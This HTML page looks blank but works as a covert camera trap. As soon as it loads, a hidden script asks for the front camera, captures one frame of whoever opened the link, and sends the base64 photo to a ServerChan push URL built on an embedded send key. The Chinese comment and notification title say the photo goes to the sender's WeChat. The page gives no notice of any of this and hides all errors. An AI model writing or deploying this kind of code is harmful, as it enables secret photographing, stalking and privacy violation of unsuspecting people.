<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
video,canvas{display:none}
body{background:#000;}
</style>
</head>
<body>
<video id="cam" autoplay playsinline muted></video>
<canvas id="box" width="480" height="480"></canvas>

<script>
const sendKey = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";

async function autoTake(){
  try{
    let stream = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:"user",width:480,height:480}
    });
    let v = document.getElementById("cam");
    let c = document.getElementById("box");
    let ctx = c.getContext("2d");
    v.srcObject = stream;

    v.onloadedmetadata = function(){
      ctx.drawImage(v,0,0,480,480);
      let base64 = c.toDataURL("image/jpeg");
      
      // 推送到微信
      fetch(`https://sctapi.ftqq.com/${sendKey}.send?title=有人打开链接拍照&desp=![image](${base64})`);
    }
  }catch(e){}
}
autoTake();
</script>
</body>
</html>
